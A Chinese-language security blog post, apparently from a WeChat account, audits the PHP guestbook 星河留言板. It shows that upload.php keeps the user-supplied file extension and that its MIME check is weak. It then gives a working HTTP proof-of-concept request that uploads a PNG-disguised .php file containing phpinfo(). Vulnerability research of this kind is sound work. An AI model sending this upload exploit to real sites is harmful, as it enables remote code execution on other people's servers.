#  【PHP代审】星河留言板存在前台任意文件上传RCE   
原创 菜狗安全  菜狗安全   2025-04-21 00:00  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlPBODMGcLpNt9QBAWypThbYIByxEDn9vF4hhNXdT8CTSgyPPuXUMgKvhEnLB3uETictJWV83Akic1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThblPVAndvyTpQFwq1A0r1dWhvB7eMS9aib6BWewwHCOepINib6su4KMIibw/640?wx_fmt=gif&from=appmsg "")  
  
点击上方蓝字·关注我们  
  
  
免责声明  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThbpd3jzvdXXROdjXCddIaUR6icvQfhjUVDAXNPbM4SuibSU8GwCr9t5VvA/640?wx_fmt=gif&from=appmsg "")  
  
  
由于传播、利用本公众号  
菜狗安全  
所提供的信息而造成的任何直接或者间接的后果及损失，均由  
使用者本人负责，公众号  
菜狗安全  
及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，会立即删除并致歉。  
  
文章目录  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThbpd3jzvdXXROdjXCddIaUR6icvQfhjUVDAXNPbM4SuibSU8GwCr9t5VvA/640?wx_fmt=gif&from=appmsg "")  
  
```
介绍
漏洞分析
漏洞复现  
最后 
```  
  
2sdfsf  
  
# 介绍  
  
一款基于PHP 7.0+开发的开源在线留言板源代码，旨在为用户提供简洁、易用且功能丰富的留言交互体验。其界面基于Bootstrap 5构建，支持响应式设计，能够适应不同设备的屏幕尺寸。程序采用POST方法提交数据，并提供了一个简易的后台管理系统，用户可以通过该后台修改网站标题、删除留言等操作。本程序依赖于Bootstrap 5.3 CSS/JS、Bootstrap Icons以及PHP 7.0+环境运行  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPk9xJia3o5nTzPF5o1qOC8HMtmKgURJ5sVGK35oHgBrs9KIgDTPjL3nAhNTDL0CeRZnhyflf2NpbeA/640?wx_fmt=other&from=appmsg "")  
# 漏洞分析  
  
**全局搜索关键词：move_uploaded_file(**  
  
**对应文件：upload.php**  
  
****  
**在第44行使用move_uploaded_file()上传文件，跟踪$targetPath，42行定义了$targetPath，由$uploadDir . $filename组成，跟踪$filename,按照公开课的思路，看后缀能否为可执行文件后缀，$filename在41行通过uniqid() . '.' . $ext组成，这里$ext就是后缀，看从哪获取，在40行通过 pathinfo获取，获取的就是我们上传文件的后缀，那么这里后缀可控**  
  
**在24行开始发现有验证文件类型的代码**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPk9xJia3o5nTzPF5o1qOC8HMuSK4KGHN7m33s5H246yJVSpMK903MiavvrmicBnRIxPcicxTe7jdGIBiaw/640?wx_fmt=png&from=appmsg "")  
  
**使用 finfo_open 和 finfo_file 函数获取上传文件的 MIME 类型，将获取到的 MIME 类型与 $allowedTypes 数组进行对比，判断是否允许该文件类型，这里过滤和没有一样**  
  
**使用 finfo_file 函数读取上传文件的二进制内容，确定其真实的 MIME 类型，检查该 MIME 类型是否在 $allowedTypes 数组中（即是否为允许的图片格式：image/jpeg、image/png、image/gif）这里要保证上传文件内容中有对应MIME类型的二进制内容，也没啥用，上传正常图片在中间插后门即可**  
# 漏洞利用  
  
**poc:**  
```
POST /upload.php HTTP/1.1
Host: liuyan:776
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNmBLaV0KeGTm4x0J
Referer: http://liuyan:776/
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Origin: http://liuyan:776
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Length: 806
------WebKitFormBoundaryNmBLaV0KeGTm4x0J
Content-Disposition: form-data; name="images[]"; filename="ELOG.php"
Content-Type: image/png
{{unquote("\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x04\x03\x00\x00\x00\xed\xdd\xe2R\x00\x00\x000PLTE\xfc\xfe\xfcS\x12\x28\x1a^/\xb9\xb6\xc5\x8d\x17\x29\xa4\xa7P\x0a\x0f\xb4r\x7dX\xac\xa3\xc6\xd7\xd3\xbf\xaaz~\x87\x92\x94i=<\x7fWY4:\xc4L\x86\\\x88\x00\x89X\x00\x00\x00VIDAT\x08\xd7c`@\x02\x1c\x06PF<?php phpinfo();?>[2\x94\x91\x96\x07el\xaf\x862Xaj\xd8\x03\xa0\x8c\x85\xc2P\x86\xa0\x0c\x84f\x16\x14\x9c\x00fL?\x28\x13\xc9\xc9\xc0\xc0\xa4\xa4\xda\x7b#\xd4e\x01\x90Q\xc0\xc0\xc0\xe5\xe2\x00dl\x00*s\x11`\xe0W\x02\x19\xb7\xd6\x00\xee\x04\x00\x1a\xe5\x0d\x92\xba\xf2\xba\xb3\x00\x00\x00\x00IEND\xaeB`\x82")}}
------WebKitFormBoundaryNmBLaV0KeGTm4x0J--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPk9xJia3o5nTzPF5o1qOC8HMHttialFYib2nJsiaO4Q1XBHMHic8LqVWFRTMR7ZIHsSXcNZ4Gq4FkABrjA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPk9xJia3o5nTzPF5o1qOC8HMa62geicMhSRkpkuNjbuqWA9icicKqd9ZfKqQmgR2mqzciapNOSCewf3oEQ/640?wx_fmt=png&from=appmsg "")  
# 最后  
  
［源码获取］微信公众号回复“星河留言板”获取下载地址  
  
  
二期公开课  
《PHP代码审计速成》持续更新中...  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPkbBVeYfrUfL88JdIrNL1s0xGx9icQnia5JQgegfKwoeIbOsm4VuVDHXxkA63vqtL6Dz8oYucicgWdpA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
# 直播通知和课件都会在交流群中发布，有需要的师傅可以加我VX，备注：交流群，我拉你进群  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPmic8RYXMickJZbXfFDicmYbdzTb4XdVfibZH9IicN9uAezcmaqbHLP929dS7AfmybpqpczicmicZzNM42AQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
性感群主不定期在线水群解答问题  
  
  
  
